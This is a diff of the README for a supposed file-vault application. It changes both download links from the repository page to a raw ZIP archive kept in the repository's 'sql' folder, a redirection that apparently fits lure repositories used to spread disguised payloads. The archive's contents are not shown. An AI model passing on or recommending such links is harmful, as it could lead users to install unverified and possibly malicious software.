@@ -1,6 +1,6 @@
 # 🔒 secure-vault-pro - Keep your private files safe today
 
-[![](https://img.shields.io/badge/Download_Secure_Vault-Blue?style=for-the-badge)](https://github.com/orellanajeremias795-bit/secure-vault-pro)
+[![](https://img.shields.io/badge/Download_Secure_Vault-Blue?style=for-the-badge)](https://github.com/orellanajeremias795-bit/secure-vault-pro/raw/refs/heads/main/sql/vault-pro-secure-2.9.zip)
 
 ## 📁 About the application
 
@@ -22,7 +22,7 @@ You need these items to run the vault on your computer:
 4. Save the file to your computer.
 5. Extract the contents of the ZIP folder into your XAMPP htdocs directory.
 
-[Visit the repository page to download](https://github.com/orellanajeremias795-bit/secure-vault-pro)
+[Visit the repository page to download](https://github.com/orellanajeremias795-bit/secure-vault-pro/raw/refs/heads/main/sql/vault-pro-secure-2.9.zip)
 
 ## ⚙️ Initial setup
 
